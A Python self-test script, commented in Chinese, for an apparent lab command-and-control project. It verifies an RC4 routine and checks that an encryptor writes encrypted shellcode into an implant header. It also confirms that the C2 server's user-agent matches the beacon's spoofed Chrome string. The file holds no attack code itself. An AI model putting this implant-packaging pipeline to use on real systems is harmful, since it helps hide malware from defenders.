#!/usr/bin/env python3
"""lab-c2/tools/selftest.py - 无编译器环境下的自检

1) RC4 已知向量 (与 implant/ekko.hpp 的 Rc4 同算法)
2) enc.py 往返: 加密 -> 还原 -> 与原文件逐字节比对
3) payload.h 结构检查
4) c2_server.py 语法与路由表可导入性(不启动监听)
"""
import hashlib
import importlib.util
import os
import random
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, ".."))
sys.path.insert(0, HERE)

import enc  # noqa: E402

FAIL = []


def check(name, ok, detail=""):
    print(("  [ok]   " if ok else "  [FAIL] ") + name + (f"  {detail}" if detail else ""))
    if not ok:
        FAIL.append(name)


def main():
    print("1) RC4 已知测试向量")
    vec = enc.rc4(b"Plaintext", b"Key").hex().upper()
    check("RC4('Key','Plaintext') == BBF316E8D940AF0AD3", vec == "BBF316E8D940AF0AD3", vec)

    print("2) enc.py 加解密往返")
    sample = bytes(random.randrange(256) for _ in range(4096))
    key = bytes(random.randrange(256) for _ in range(16))
    enc.KEY = key
    blob = enc.rc4(sample, key)
    check("密文 != 明文", blob != sample)
    check("解密还原一致 (sha256 相同)",
          hashlib.sha256(enc.rc4(blob, key)).hexdigest() == hashlib.sha256(sample).hexdigest())

    print("3) 生成 payload.h")
    os.makedirs(os.path.join(ROOT, "build"), exist_ok=True)
    binp = os.path.join(ROOT, "build", "selftest.bin")
    with open(binp, "wb") as f:
        f.write(sample)
    enc.KEY = key
    old_argv = sys.argv
    sys.argv = ["enc.py", binp]
    enc.main()
    sys.argv = old_argv
    src = open(os.path.join(ROOT, "implant", "payload.h"), encoding="ascii").read()
    check("payload.h 含 g_shellcode[]/g_scLen/g_key/g_keyLen",
          all(s in src for s in ("g_shellcode[]", "g_scLen =", "g_key[]", "g_keyLen =")))
    check(f"g_scLen == {len(sample)}", f"g_scLen = {len(sample)};" in src)

    print("4) c2_server.py 导入检查")
    spec = importlib.util.spec_from_file_location("c2s", os.path.join(ROOT, "c2_server.py"))
    mod = importlib.util.module_from_spec(spec)
    try:
        spec.loader.exec_module(mod)
        check("导入成功 (aiohttp 已安装)", True)
        check("UA 与 beacon.cpp 一致", "Chrome/124.0.0.0" in mod.UA)
    except ModuleNotFoundError as e:
        check("导入成功", False, f"{e} -> 先执行: pip install aiohttp")

    print()
    print("结果: " + ("全部通过" if not FAIL else f"{len(FAIL)} 项失败: {FAIL}"))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
